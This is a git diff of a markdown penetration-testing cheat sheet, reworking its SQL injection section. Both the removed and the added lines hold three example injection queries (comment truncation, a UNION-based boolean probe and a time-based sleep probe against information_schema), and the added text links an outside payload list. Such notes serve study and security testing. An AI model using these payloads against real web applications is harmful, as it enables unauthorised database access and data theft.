@@ -97,19 +97,19 @@ $(...)
 ```
 You can find payloads of Windows and linux with file uploads of this repositorie
   ### XSS (Cross Site Scripting)
-  ### SQL Injection  
-  Check in input web, url, or in request parameter if webapplication use sql 
-  ```SQL
-  SELECT * from artcile where id = 1 ;--(e.g: SELECT column_name from table_name where filter = 1)
-  ```
-  BINARY SQL Injection, if message error is false also its a good request sql
-  ```SQL
-  SELECT * from artcile where id = '1' UNION SELECT 1,2,3 where database() like 'sq%';--
-  ```
-  SLEEP SQL Injection, if request sleep 1 sec also its a good request sql
-  ```SQL
-  SELECT * from artcile where id = '1' UNION SELECT sleep(1),2 from information_schema.columns where table_name = 'sqli_one' and table_name = 'users' and column_name = 'id';--
-  ```
+  ### SQL Injection    
+  Its time to SQLI Suuuuuuuuuuuuuuuuuu !!!!!!!!!!!  
+Before startin here some link and images useful : 
+- [Advance Payload SQLI Github](https://github.com/payloadbox/sql-injection-payload-list)
+  
+  ![](types_of_sqli.jpg)
+  
+```SQL
+SELECT * from artcile where id = 1 ;--(e.g: SELECT column_name from table_name where filter = 1)
+SELECT * from artcile where id = '1' UNION SELECT 1,2,3 where database() like 'sq%';--
+SELECT * from artcile where id = '1' UNION SELECT sleep(1),2 from information_schema.columns where table_name = 'sqli_one' and table_name = 'users' and column_name = 'id';--
+```
+
   ## *Top 4 non-secure application*
   ## *Top 5 security misconfiguration*
   ### **XEE (XML External Entity)**
